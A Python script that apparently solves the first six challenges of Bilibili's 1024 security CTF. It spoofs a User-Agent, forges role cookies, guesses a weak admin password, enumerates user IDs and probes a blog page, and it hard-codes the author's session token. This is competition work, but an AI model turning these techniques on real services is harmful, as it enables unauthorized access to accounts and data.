import requests
import json

# 登录自己账号访问 https://security.bilibili.com/sec1024/ 时请求头中的session
session = "eyJ1aWQiOiIzOTc0NDM1NTIifQ.X5QgYA.s4xxccXa8iIxgnEQv1fpLRVMnAg"


# 第一题 查看源代码找到的地址+模拟UA访问
def get_1():
    global session
    url = "http://45.113.201.36/api/ctf/2"
    header = {
        "Cookie": "session=" + session,
        "User-Agent": "bilibili Security Browser"
    }
    resp = requests.get(url, headers=header).json()
    print("第1题的答案", resp["data"], "接口响应:{}".format(resp))


# 第二题 访问另一个接口
def get_2():
    global session
    url = "http://45.113.201.36/api/admin"
    header = {
        "Cookie": "session=" + session,
        "User-Agent": "bilibili Security Browser"
    }
    resp = requests.get(url, headers=header).json()
    print("第2题的答案", resp["data"], "接口响应:{}".format(resp))


# 通过遍历弱密码 试过sql注入 害
def get_3():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session=' + session + '; role=ee11cbb19052e40b07aac0ca060c23ee',
        'Content-Type': 'application/json'
    }
    data = {
        "username": "admin",
        "passwd": "bilibili"
    }
    response = requests.post('http://45.113.201.36/api/ctf/3', headers=headers, data=json.dumps(data)).json()
    print('第3题答案', response['data'], "接口响应:{}".format(response))


def get_4():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session = ' + session + ';role=7b7bc2512ee1fedcd76bdc68926d4f7b'
    }
    response = requests.get('http://45.113.201.36/api/ctf/4', headers=headers).json()
    print('第4题答案是:', response['data'])


# 疯狂遍历UID? 根据源代码提示从100336850开始 我的是:100336947
def get_5():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
        'Cookie': 'session=' + session + '; role=ee11cbb19052e40b07aac0ca060c23ee',
        'Referer': 'http://45.113.201.36/user.html'
    }
    for i in range(100336850, 100336980):
        response = requests.get('http://45.113.201.36/api/ctf/5?uid=' + str(i), headers=headers).json()  # 100336973
        if response['data'] != '':
            print('第5题答案是:', response['data'], "UID:{}".format(i))
            break
        else:
            print("UID:{}".format(i))


def get_6():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
        'Cookie': 'session=' + session + '; role=ee11cbb19052e40b07aac0ca060c23ee',
        # 'Referer': 'http://45.113.201.36/user.html'
    }
    resp = requests.get("http://120.92.151.189/blog/single.php?id=1", headers=headers)
    print(resp)


get_6()

# get_1()
# get_2()
# get_3()
# get_4()
# get_5()
